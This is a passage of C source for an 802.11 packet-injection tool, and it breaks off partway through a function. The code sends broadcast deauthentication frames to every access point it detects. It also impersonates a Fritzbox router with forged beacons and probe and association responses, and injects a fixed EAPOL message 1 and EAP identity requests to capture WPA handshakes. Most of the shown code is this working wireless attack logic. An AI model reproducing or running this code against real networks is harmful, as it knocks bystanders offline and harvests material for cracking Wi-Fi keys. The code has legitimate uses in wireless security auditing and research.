#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <fcntl.h>
#include <ftw.h>
#include <libgen.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <utime.h>
#include <time.h>
#include <pcap.h>
#include <linux/wireless.h>

#include "common.h"

#ifdef DOGPIOSUPPORT
#include <wiringPi.h>
#endif

/*===========================================================================*/
/* Definitionen */

#define TT_SIGUSR1 (SIGUSR1)
#define TT_SIGUSR2 (SIGUSR2)
#define TIME_INTERVAL_1S 5
#define TIME_INTERVAL_1NS 0

#define TIME_INTERVAL_2S 3
#define TIME_INTERVAL_2NS 0

#define RINGBUFFERSIZE 128
#define SENDPACKETSIZEMAX 0x1ff

#define WPA_M1  0b00000001
#define WPA_M1W 0b00010001
#define WPA_M2  0b00000010
#define WPA_M2W 0b00100010
#define WPA_M3  0b00000100
#define WPA_M4  0b00001000


void set_timer(timer_t timerid, int seconds, long int nanoseconds);

struct aplist
{
 long int	tv_sec;
 adr_t		addr_ap;
 uint8_t	deauthcount;
 uint8_t	essid_len;
 uint8_t	essid[32];
};
typedef struct aplist apl_t;
#define	APL_SIZE (sizeof(apl_t))

struct staaplist
{
 long int	tv_sec;
 adr_t		addr_sta;
 adr_t		addr_ap;
 uint8_t	essid_len;
 uint8_t	essid[32];
};
typedef struct staaplist staapl_t;
#define	STAAPL_SIZE (sizeof(staapl_t))

/*===========================================================================*/
/* globale variablen */

pcap_t *pcapin = NULL;
pcap_dumper_t *pcapout = NULL;
int staytime = TIME_INTERVAL_2S;
uint8_t channel = 1;
uint16_t mysequencenr = 1;
uint8_t lastbeaconing = false;

unsigned long long int myoui;
unsigned long long int mynic;
unsigned long long int mymac;

timer_t timer1;
timer_t timer2;

adr_t nulladdr;
adr_t broadcastaddr;
adr_t myaddr;

apl_t *beaconliste = NULL;
staapl_t *proberesponseliste = NULL;
apl_t *proberequestliste = NULL;
staapl_t *directproberequestliste = NULL;
staapl_t *associationrequestliste = NULL;
staapl_t *reassociationrequestliste = NULL;

uint8_t ipv46 = false;
uint8_t wepdata = false;

char *interfacename = NULL;

/*===========================================================================*/
/* Konstante */

const int myvendor[] =
{
0x00006c, 0x000101, 0x00054f, 0x000578, 0x000b18, 0x000bf4, 0x000c53, 0x000d58,
0x000da7, 0x000dc2, 0x000df2, 0x000e17, 0x000e22, 0x000e2a, 0x000eef, 0x000f09,
0x0016b4, 0x001761, 0x001825, 0x002067, 0x00221c, 0x0022f1, 0x00234a, 0x00238c,
0x0023f7, 0x002419, 0x0024fb, 0x00259d, 0x0025df, 0x00269f, 0x005047, 0x005079,
0x0050c7, 0x0084ed, 0x0086a0, 0x00a054, 0x00a085, 0x00bb3a, 0x00cb00, 0x0418b6,
0x0c8112, 0x100000, 0x10ae60, 0x10b713, 0x1100aa, 0x111111, 0x140708, 0x146e0a,
0x18421d, 0x1cf4ca, 0x205b2a, 0x20d160, 0x24336c, 0x24bf74, 0x28ef01, 0x3cb87a,
0x487604, 0x48f317, 0x50e14a, 0x544e45, 0x580943, 0x586ed6, 0x5c6b4f, 0x609620,
0x68e166, 0x706f81, 0x78f944, 0x7ce4aa, 0x8c8401, 0x8ce748, 0x906f18, 0x980ee4,
0x9c93e4, 0xa468bc, 0xa4a6a9, 0xacde48, 0xb025aa, 0xb0ece1, 0xb0febd, 0xb4e1eb,
0xc02250, 0xc8aacc, 0xd85dfb, 0xdc7014, 0xe00db9, 0xe0cb1d, 0xe80410, 0xf04f7c,
0xf0a225, 0xfcc233
};
#define MYVENDOR_SIZE sizeof(myvendor)


const uint8_t hdradiotap[] =
{
 0x00, 0x00, // <-- radiotap version
 0x0c, 0x00, // <- radiotap header length
 0x04, 0x80, 0x00, 0x00, // <-- bitmap
 0x02, // <-- rate
 0x00, // <-- padding for natural alignment
 0x18, 0x00, // <-- TX flags
};
#define HDRRT_SIZE sizeof(hdradiotap)


uint8_t authenticationframe[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define AUTHENTICATION_SIZE sizeof(authenticationframe)


/* Fritzbox 3272 Beacon */
uint8_t beaconfb3272[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
0x03, 0x01, 0x0b, //channel
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
0x07, 0x06, 0x44, 0x45, 0x20, 0x01, 0x0d, 0x14,
0x2a, 0x01, 0x00,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01, 0x20
};
#define FB3272BEACON_SIZE sizeof(beaconfb3272)


/* Fritzbox 3272 Proberesponse*/
uint8_t proberesponsefb3272[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
0x03, 0x01, 0x0b,
0x07, 0x06, 0x44, 0x45, 0x20, 0x01, 0x0d, 0x14,
0x2a, 0x01, 0x00,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x6f, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02, 0x10, 0x3b, 0x00, 0x01, 0x03, 0x10, 0x47, 0x00, 0x10, 0xe1, 0x88, 0x94,
0x6e, 0x88, 0x55, 0xf6, 0xb5, 0xef, 0xef, 0x34, 0x81, 0xc4, 0xcb, 0xb5, 0x30, 0x10, 0x21, 0x00, 0x03, 0x41, 0x56, 0x4d, 0x10, 0x23, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78,
0x10, 0x24, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x42, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x54, 0x00, 0x08, 0x00, 0x06, 0x00, 0x50, 0xf2, 0x04, 0x00, 0x01,
0x10, 0x11, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x08, 0x00, 0x02, 0x23, 0x88, 0x10, 0x3c, 0x00, 0x01, 0x01, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01,
0x20
};
#define FB3272PROBERESPONSE_SIZE sizeof(proberesponsefb3272)


const uint8_t associationresponse[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0b, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define ASSOCRESP_SIZE sizeof(associationresponse)


const uint8_t anonce[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02, 0x03, 0x00, 0x5f, 0x02, 0x00, 0x8a, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf7,
0x00, 0x68, 0x20, 0x09, 0xe2, 0x1f, 0x0e, 0xbc, 0xe5, 0x62, 0xb9, 0x06, 0x5b, 0x54, 0x89, 0x79,
0x09, 0x9a, 0x65, 0x52, 0x86, 0xc0, 0x77, 0xea, 0x28, 0x2f, 0x6a, 0xaf, 0x13, 0x8e, 0x50, 0xcd,
0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00
};
#define ANONCE_SIZE sizeof(anonce)


const uint8_t requestidentity[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02, 0x00, 0x00, 0x05, 0x01, 0xb8, 0x00, 0x05, 0x01
};
#define REQUESTIDENTITY_SIZE sizeof(requestidentity)

/*===========================================================================*/
bool initgloballists()
{
memset(&nulladdr, 0, 6);
memset(&broadcastaddr, 0xff, 6);

mynic = rand() & 0xffffff;
myoui = myvendor[rand() % ((MYVENDOR_SIZE / sizeof(int))-1)];
mymac = (myoui << 24) | mynic;
memset(&myaddr, 0, 6);
myaddr.addr[5] = mynic & 0xff;
myaddr.addr[4] = (mynic >> 8) & 0xff;
myaddr.addr[3] = (mynic >> 16) & 0xff;
myaddr.addr[2] = myoui & 0xff;
myaddr.addr[1] = (myoui >> 8) & 0xff;
myaddr.addr[0] = (myoui >> 16) & 0xff;

if((beaconliste = malloc((RINGBUFFERSIZE +1) *APL_SIZE)) == NULL)
	return false;
memset(beaconliste, 0, (RINGBUFFERSIZE +1) *APL_SIZE);

if((proberesponseliste = malloc((RINGBUFFERSIZE +1) *STAAPL_SIZE)) == NULL)
	return false;
memset(proberesponseliste, 0, (RINGBUFFERSIZE +1) *STAAPL_SIZE);

if((proberequestliste = malloc((RINGBUFFERSIZE +1) *APL_SIZE)) == NULL)
	return false;
memset(proberequestliste, 0, (RINGBUFFERSIZE +1) *APL_SIZE);

if((directproberequestliste = malloc((RINGBUFFERSIZE +1) *STAAPL_SIZE)) == NULL)
	return false;
memset(directproberequestliste, 0, (RINGBUFFERSIZE +1) *STAAPL_SIZE);

if((associationrequestliste = malloc((RINGBUFFERSIZE +1) *STAAPL_SIZE)) == NULL)
	return false;
memset(associationrequestliste, 0, (RINGBUFFERSIZE +1) *STAAPL_SIZE);

if((reassociationrequestliste = malloc((RINGBUFFERSIZE +1) *STAAPL_SIZE)) == NULL)
	return false;
memset(reassociationrequestliste, 0, (RINGBUFFERSIZE +1) *STAAPL_SIZE);

return true;
}
/*===========================================================================*/
void nextmac()
{
mynic++;
myaddr.addr[5] = mynic & 0xff;
myaddr.addr[4] = (mynic >> 8) & 0xff;
myaddr.addr[3] = (mynic >> 16) & 0xff;
return;
}
/*===========================================================================*/
void senddeauth(uint8_t dart, uint8_t reason, uint8_t *macaddr1, uint8_t *macaddr2)
{
int pcapstatus;
mac_t grundframe;
uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = dart;
grundframe.duration = 0x013a;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);
memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket + HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
sendpacket[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
sendpacket[HDRRT_SIZE +MAC_SIZE_NORM +1] = 0;
pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE + MAC_SIZE_NORM +2);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending deauthentication %s \n", pcap_geterr(pcapin));
	}

grundframe.retry = 1;
memcpy(sendpacket +sizeof(hdradiotap), &grundframe, MAC_SIZE_NORM);

pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE + MAC_SIZE_NORM +2);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending retry deauthentication %s \n", pcap_geterr(pcapin));
	}

mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;
return ;
}
/*===========================================================================*/
void sendbeacon(uint8_t *macaddr2, uint8_t essid_len, uint8_t *essid)
{
struct timeval tv1;
int pcapstatus;
mac_t grundframe;
beacon_t beacontsframe;
essid_t essidframe;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = MAC_ST_BEACON;
grundframe.duration = 0;
memcpy(grundframe.addr1.addr, broadcastaddr.addr, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);

gettimeofday( &tv1,  NULL );
beacontsframe.beacon_timestamp = htole64(tv1.tv_sec*1000000UL + tv1.tv_usec);
beacontsframe.beacon_interval = 0x0064;
beacontsframe.beacon_capabilities = 0x431;

essidframe.info_essid = 0;
essidframe.info_essid_len = essid_len;

memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &beacontsframe, BEACONINFO_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE, &essidframe, ESSIDINFO_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE, essid, essid_len);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len, beaconfb3272, FB3272BEACON_SIZE);

sendpacket[HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +12] = channel;

pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +FB3272BEACON_SIZE);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif

	fprintf(stderr, "error while sending beacon %s \n", pcap_geterr(pcapin));
	}
mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;
return;
}
/*===========================================================================*/
void sendproberesponse(uint8_t *macaddr1, uint8_t *macaddr2, uint8_t essid_len, uint8_t **essid)
{
struct timeval tv1;
int pcapstatus;
mac_t grundframe;
beacon_t beacontsframe;
essid_t essidframe;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = MAC_ST_PROBE_RESP;
grundframe.duration = 0x013a;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);

gettimeofday( &tv1,  NULL );
beacontsframe.beacon_timestamp = htole64(tv1.tv_sec*1000000UL + tv1.tv_usec);
beacontsframe.beacon_interval = 0x0064;
beacontsframe.beacon_capabilities = 0x431;

essidframe.info_essid = 0;
essidframe.info_essid_len = essid_len;

memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &beacontsframe, BEACONINFO_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE, &essidframe, ESSIDINFO_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE, essid, essid_len);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len, proberesponsefb3272, FB3272PROBERESPONSE_SIZE);

sendpacket[HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +12] = channel;

pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +FB3272PROBERESPONSE_SIZE);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending probe response %s \n", pcap_geterr(pcapin));
	}
mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;
return;
}
/*===========================================================================*/
void sendauthentication(uint8_t *macaddr1, uint8_t *macaddr2)
{
mac_t grundframe;
int pcapstatus;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = MAC_ST_AUTH;
grundframe.duration = 0x013a;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);

memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &authenticationframe, AUTHENTICATION_SIZE);

pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATION_SIZE);

if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending authentication %s \n", pcap_geterr(pcapin));
	}
mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;
return;
}
/*===========================================================================*/
void sendacknowledgement(uint8_t *macaddr1)
{
mac_t grundframe;
int pcapstatus;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_CTRL;
grundframe.subtype = MAC_ST_ACK;
grundframe.duration = 0;
memcpy(grundframe.addr1.addr, macaddr1, 6);

memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_ACK);

pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE +MAC_SIZE_ACK);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending acknowledgement %s \n", pcap_geterr(pcapin));
	}
return;
}
/*===========================================================================*/
void sendassociationresponse(uint8_t dart, uint8_t *macaddr1, uint8_t *macaddr2)
{
int pcapstatus;
mac_t grundframe;
assocres_t associationframe;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = dart;
grundframe.duration = 0x013a;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);

associationframe.ap_capabilities = 0x0431;
associationframe.ap_status = 0;
associationframe.ap_associd = 1;

memcpy(&sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &associationframe, ASSOCIATIONRESF_SIZE);

memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESF_SIZE, &associationresponse, ASSOCRESP_SIZE);

pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESF_SIZE +ASSOCRESP_SIZE);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending associationresponce %s \n", pcap_geterr(pcapin));
	}
mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;

return;
}
/*===========================================================================*/
void sendkey1(uint8_t *macaddr1, uint8_t *macaddr2)
{
int pcapstatus;
mac_t grundframe;
qos_t qosframe;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
memset(&qosframe, 0, QOS_SIZE);
grundframe.type = MAC_TYPE_DATA;
grundframe.subtype = MAC_ST_QOSDATA;
grundframe.from_ds = 1;
grundframe.duration = 0x3a01;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
qosframe.control = 0;
qosframe.flags = 0;
memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &qosframe, QOS_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE, &anonce, ANONCE_SIZE);

pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE +ANONCE_SIZE);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending key 1 %s \n", pcap_geterr(pcapin));
	return;
	}
return;
}
/*===========================================================================*/
void sendrequestidentity(uint8_t *macaddr1, uint8_t *macaddr2)
{
int pcapstatus;
mac_t grundframe;
qos_t qosframe;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
memset(&qosframe, 0, QOS_SIZE);
grundframe.type = MAC_TYPE_DATA;
grundframe.subtype = MAC_ST_QOSDATA;
grundframe.from_ds = 1;
grundframe.duration = 0x3a01;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
qosframe.control = 0;
qosframe.flags = 0;
memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &qosframe, QOS_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE, &requestidentity, REQUESTIDENTITY_SIZE);

pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE +REQUESTIDENTITY_SIZE);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending request identity %s \n", pcap_geterr(pcapin));
	return;
	}
return;
}
/*===========================================================================*/
int sortstaaplist_by_time(const void *a, const void *b)
{
staapl_t *ia = (staapl_t *)a;
staapl_t *ib = (staapl_t *)b;

return ia->tv_sec < ib->tv_sec;
}
/*===========================================================================*/
int sortaplist_by_time(const void *a, const void *b)
{
apl_t *ia = (apl_t *)a;
apl_t *ib = (apl_t *)b;

return ia->tv_sec < ib->tv_sec;
}
/*===========================================================================*/
bool handlebeaconframes(time_t tvsec, uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
{
apl_t *zeiger;
int c;

zeiger = beaconliste;
for(c = 0; c < RINGBUFFERSIZE; c++)
	{
	if((memcmp(zeiger->addr_ap.addr, mac_ap, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
		{
		zeiger->tv_sec = tvsec;
		zeiger->deauthcount += 1;
		if(zeiger->deauthcount >= (staytime *5))
			{
			senddeauth(MAC_ST_DEAUTH, WLAN_REASON_UNSPECIFIED, broadcastaddr.addr, zeiger->addr_ap.addr);
			zeiger->deauthcount = 0;
			}
		return true;
		}
	if(memcmp(nulladdr.addr, zeiger->addr_ap.addr, 6) == 0)
		break;
	zeiger++;
	}
zeiger->tv_sec = tvsec;
memcpy(zeiger->addr_ap.addr, mac_ap, 6);
zeiger->essid_len = essid_len;
memset(zeiger->essid, 0, 32);
memcpy(zeiger->essid, essidname, essid_len);
senddeauth(MAC_ST_DEAUTH, WLAN_REASON_UNSPECIFIED, broadcastaddr.addr, zeiger->addr_ap.addr);
zeiger->deauthcount = 0;
qsort(beaconliste, RINGBUFFERSIZE +1, APL_SIZE, sortaplist_by_time);
return false;
}
/*===========================================================================*/
bool handleproberesponseframes(time_t tvsec, uint8_t *mac_sta, uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
{
staapl_t *zeiger;
int c;

zeiger = proberesponseliste;
for(c = 0; c < RINGBUFFERSIZE; c++)
	{
	if((memcmp(zeiger->addr_sta.addr, mac_sta, 6) == 0) && (memcmp(zeiger->addr_ap.addr, mac_ap, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
		{
		zeiger->tv_sec = tvsec;
		return true;
		}
	if(memcmp(nulladdr.addr, zeiger->addr_ap.addr, 6) == 0)
		break;
	zeiger++;
	}
zeiger->tv_sec = tvsec;
memcpy(zeiger->addr_sta.addr, mac_sta, 6);
memcpy(zeiger->addr_ap.addr, mac_ap, 6);
zeiger->essid_len = essid_len;
memset(zeiger->essid, 0, 32);
memcpy(zeiger->essid, essidname, essid_len);
qsort(proberesponseliste, RINGBUFFERSIZE +1, STAAPL_SIZE, sortstaaplist_by_time);
return false;
}
/*===========================================================================*/
bool handleproberequestframes(time_t tvsec, uint8_t *mac_sta, uint8_t essid_len, uint8_t **essidname)
{
apl_t *zeiger;
int c;

zeiger = proberequestliste;
